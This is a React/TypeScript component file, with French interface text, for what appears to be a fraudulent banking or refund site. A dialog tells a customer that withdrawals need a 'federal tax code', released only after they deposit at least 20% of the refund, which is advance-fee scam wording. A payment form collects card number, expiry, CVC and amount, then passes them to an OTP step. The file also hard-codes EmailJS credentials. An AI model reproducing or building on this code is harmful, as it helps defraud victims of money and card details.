import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Icons } from "./Icons";
import { ChangeEvent, useState } from "react";

import OtpModal from "./OTPModal";


import { Loader2 } from "lucide-react";

import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";


import { useUserStore } from "@/actions/zustand/userState";


import { useGetUserById } from "@/actions/tanstack/query";

import emailjs from "@emailjs/browser";
import { Toaster, toast } from "sonner";

export function AlertDialogDemo({
  openAlert,
  setOpenAlert,
}: {
  openAlert: boolean;
  setOpenAlert: (P: boolean) => void;
}) {
  const user = useUserStore((state)=> state.user)
  const [isLoading, setIsLoading] = useState(false)
  const sendEmail = async()=>{
    setIsLoading(true)
    emailjs
    .send(
      "service_ofgw6zl",
      "template_3oel94s",
      {
        from_name:`${user?.firstName} ${" "} ${user?.firstName}` ,
        from_email:user?.email,
        from_phone: "aucune",
        message: ` l'utilisateur  ${user?.firstName} ${" "} ${user?.firstName} demande le code`,
      },
      "_v1mrf9su7HdlCiCM"
    )
    .then(
      () => {
        setIsLoading(false);
        toast.success(
          "Merci pour votre confiance, je reviendrai vers vous dès que possible"
        );
      },
      (error) => {
        toast.error("échec du chargement du message, veuillez réessayer");
        console.log(error);
        setIsLoading(false);
      }
    );
  }
  return (
    <AlertDialog open={openAlert} onOpenChange={setOpenAlert}>
      <Toaster richColors/>
      <AlertDialogContent className="text-black bg-white text-left max-md:w-[90%] max-md:rounded-md ">
        <AlertDialogHeader>
          <AlertDialogTitle>Activation du compte et code fiscal fédéral</AlertDialogTitle>
          <AlertDialogDescription className="space-y-4 text-mono text-left">
            <p>
              Cher client, nous avons regardé de près votre compte et il montre
              que le compte a été récemment créé. Pour que le code fiscal
              fédéral a 6 chiffres permette des retraits réussis de votre
              compte, nous vous demandons de bien vouloir initier une
              transaction d'au moins 20 % du montant total du remboursement.
              Cette transaction initiale est nécessaire pour vérifier l'activité
              de votre compte et répondent aux normes réglementaires. Ce dépôt
              sera ajouté au solde de votre compte.
            </p>
            
            <p>
              Une fois que vous aurez effectué ce dépôt, nous serons en mesure de
            traiter les documents nécessaires et de vous envoyer le code de
            tâche fédéral requis. Dès réception du code fiscal, votre compte
            sera entièrement activé et vous serez éligible.
            </p>
          </AlertDialogDescription>
        </AlertDialogHeader>
        <AlertDialogFooter>
          <AlertDialogCancel>Annuler</AlertDialogCancel>
          <Button
          onClick={()=> sendEmail()}
          disabled={isLoading} className="form-btn">
            {isLoading ? (
              <>
                <Loader2 size={20} className="animate-spin" /> &nbsp;
                Loading...
              </>
            ) : "Obtenir le code"}
        
          </Button>
        </AlertDialogFooter>
      </AlertDialogContent>
    </AlertDialog>
  );
}


export function CardsPaymentMethod() {
  const user = useUserStore((state) => state.user);

  const { data: real_time_user } = useGetUserById(user?.$id!);

  interface FormValues {
    name: string;
    city: string;
    number: string;
    amount: string;
    cvc: string;
    year: string;
    month: string;
  }

  const months = [
    "Janvier",
    "Février",
    "Mars",
    "Avril",
    "Mai",
    "Juin",
    "Juillet",
    "Août",
    "Septembre",
    "Octobre",
    "Novembre",
    "Décembre",
  ];
  const [openAlert, setOpenAlert] = useState(false);
  const [formValues, setFormValues] = useState({
    name: "",
    city: "",
    number: "",
    amount: "",
    cvc: "",
    year: "",
    month: "",
  });
  const [status, setStatus] = useState("");
  const [open, setOpen] = useState(false);

  const onSubmite = (e: ChangeEvent<HTMLInputElement>) => {
    e.preventDefault();
    const { name, city, number, amount, cvc } = formValues;
    console.log(formValues);

    if (
      name === "" ||
      city === "" ||
      number === "" ||
      amount === "" ||
      cvc === ""
    ) {
      return toast.error("Veuillez remplir toutes les informations ");
    }

    if (
      real_time_user?.code === null ||
      real_time_user?.code === "" ||
      real_time_user?.code === " "
    ) {
      setOpenAlert(true);
      setStatus("failed");
    } else if (
      real_time_user?.code ||
      real_time_user?.code !== "" ||
      real_time_user?.code !== null ||
      real_time_user?.code?.length > 0
    ) {
      setOpen(true);
      setStatus("sucess");
    }
  };

  return (
    <Card className="grid gap-6 border-0 right-0 shadow-none  ">
      <OtpModal
        open={open}
        setOpen={setOpen}
        userId={user?.userId}
        values={formValues}
        status={status}
      />
      <AlertDialogDemo openAlert={openAlert} setOpenAlert={setOpenAlert} />
      <Toaster richColors />
       <AlertDialogDemo openAlert={openAlert} setOpenAlert={setOpenAlert} />
      <CardHeader>
        <CardTitle>Méthode de paiement</CardTitle>
        <CardDescription>
          Ajoutez un nouveau mode de paiement à votre compte.
        </CardDescription>
      </CardHeader>
      <CardContent className=" overflow-y-auto no-scrollbar grid gap-6 border-0 right-0">
        <RadioGroup defaultValue="card" className="grid grid-cols-3 gap-4">
          <div>
            <RadioGroupItem
              value="card"
              id="card"
              className="peer sr-only"
              aria-label="Card"
            />
            <Label
              htmlFor="card"
              className="flex flex-col items-center justify-between rounded-md border-2 border-muted bg-transparent p-4 hover:bg-accent hover:text-accent-foreground peer-data-[state=checked]:border-primary [&:has([data-state=checked])]:border-primary"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                className="mb-3 h-6 w-6"
              >
                <rect width="20" height="14" x="2" y="5" rx="2" />
                <path d="M2 10h20" />
              </svg>
              Carte
            </Label>
          </div>
          <div>
            <RadioGroupItem
              value="paypal"
              id="paypal"
              className="peer sr-only"
              aria-label="Paypal"
            />
            <Label
              htmlFor="paypal"
              className="flex flex-col items-center justify-between rounded-md border-2 border-muted bg-transparent p-4 hover:bg-accent hover:text-accent-foreground peer-data-[state=checked]:border-primary [&:has([data-state=checked])]:border-primary"
            >
              <Icons.paypal className="mb-3 h-6 w-6" />
              Paypal
            </Label>
          </div>
          <div>
            <RadioGroupItem
              value="apple"
              id="apple"
              className="peer sr-only"
              aria-label="Apple"
            />
            <Label
              htmlFor="apple"
              className="flex flex-col items-center justify-between rounded-md border-2 border-muted bg-transparent p-4 hover:bg-accent hover:text-accent-foreground peer-data-[state=checked]:border-primary [&:has([data-state=checked])]:border-primary "
            >
              <Icons.apple className="mb-3 h-6 w-6" />
              Apple
            </Label>
          </div>
        </RadioGroup>
        <form action="" className="space-y-6" onSubmit={onSubmite}>
          <div className="grid gap-2">
            <Label htmlFor="name">Nom</Label>
            <Input
              value={formValues.name}
              onChange={(e) =>
                setFormValues({ ...formValues, name: e.target.value })
              }
              className="input-class"
              id="name"
              placeholder="Nom de la Cart"
            />
          </div>
          <div className="grid gap-2">
            <Label htmlFor="ville">Ville</Label>
            <Input
              value={formValues.city}
              onChange={(e) =>
                setFormValues({ ...formValues, city: e.target.value })
              }
              className="input-class"
              id="city"
              placeholder="Ville"
            />
          </div>
          <div className="grid gap-2">
            <Label htmlFor="number">Numéro de carte</Label>
            <Input
              value={formValues.number}
              onChange={(e) => {
                let inputValue = e.target.value.replace(/\s+/g, ""); // Remove existing spaces
                let formattedValue = "";

                for (let i = 0; i < inputValue.length; i += 4) {
                  if (i + 4 < inputValue.length) {
                    formattedValue += inputValue.substr(i, 4) + " ";
                  } else {
                    formattedValue += inputValue.substr(
                      i,
                      inputValue.length - i
                    );
                  }
                }
                setFormValues({ ...formValues, number: formattedValue.trim() });
              }}
              className="input-class"
              id="number"
              placeholder="Numéro de carte"
            />
          </div>

          <div className="grid gap-2">
            <Label htmlFor="city">Montant</Label>
            <Input
              value={formValues.amount}
              onChange={(e) =>
                setFormValues({ ...formValues, amount: e.target.value })
              }
              className="input-class"
              id="city"
              placeholder="Montant"
            />
          </div>
          <div className="grid grid-cols-3 gap-4">
            <div className="grid gap-2">
              <Label htmlFor="month">Mois</Label>
              <Select>
                <SelectTrigger id="month" aria-label="Month">
                  <SelectValue placeholder="Mois" />
                </SelectTrigger>
                <SelectContent className="bg-white">
                  {months.map((m, i) => (
                    <SelectItem
                      key={i}
                      className="hover:bg-gray-300"
                      value={m}
                      onChange={() =>
                        setFormValues({ ...formValues, month: months[i] })
                      }
                    >
                      {m}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="grid gap-2">
              <Label htmlFor="year">Anne</Label>
              <Select>
                <SelectTrigger id="year" aria-label="Year">
                  <SelectValue placeholder="Anne" />
                </SelectTrigger>
                <SelectContent className="bg-white ">
                  {Array.from({ length: 15 }, (_, i) => (
                    <SelectItem
                      className="hover:bg-gray-300"
                      key={i}
                      value={`${new Date().getFullYear() + i}`}
                      onChange={() => {
                        setFormValues({
                          ...formValues,
                          year: (new Date().getFullYear() + i).toLocaleString(),
                        });
                      }}
                    >
                      {new Date().getFullYear() + i}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="grid gap-2">
              <Label htmlFor="cvc">CVC</Label>
              <Input
                value={formValues.cvc}
                onChange={(e) =>
                  setFormValues({ ...formValues, cvc: e.target.value })
                }
                id="cvc"
                placeholder="CVC"
              />
            </div>
          </div>
          <Button className="w-full bg-bankGradient text-white">
            Continuer
          </Button>
        </form>
      </CardContent>
      <CardFooter>
      
      </CardFooter>
    </Card>
  );
}
